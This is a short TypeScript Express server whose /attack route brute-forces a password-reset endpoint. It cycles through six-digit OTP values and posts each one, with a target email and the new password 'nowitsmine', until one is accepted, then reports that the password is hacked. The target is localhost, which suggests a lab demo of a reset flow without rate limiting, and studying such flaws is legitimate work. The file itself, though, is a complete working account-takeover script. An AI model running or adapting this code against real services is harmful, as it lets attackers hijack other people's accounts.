import express from "express";
import axios from "axios";

const app = express();
app.use(express.json());

let possibleOtps:any = [];

async function generateOtps(){
    for (let i = 100000; i<=900000; i++){
        possibleOtps.push(i);
    }
    return "otp generated"
}

app.get('/', async(req,res)=>{
    const op:string = await generateOtps();
    return res.json({
        msg:op
    })
})

app.post('/attack', async(req, res)=>{
    const email = req.body.email;
    
    for (let i = 0; i < possibleOtps.length; i++){
        let otp:string = possibleOtps[i].toString();
        const response = await axios.post('http://localhost:3000/reset-password', {
          
            "email":email,
            "newpassword":"nowitsmine",
            "otp":otp
        
        })
        if(response.status == 200){
            break;
        }
    }
    return res.json({
        msg:`the password is hacked.`
    })
})

app.listen(3001);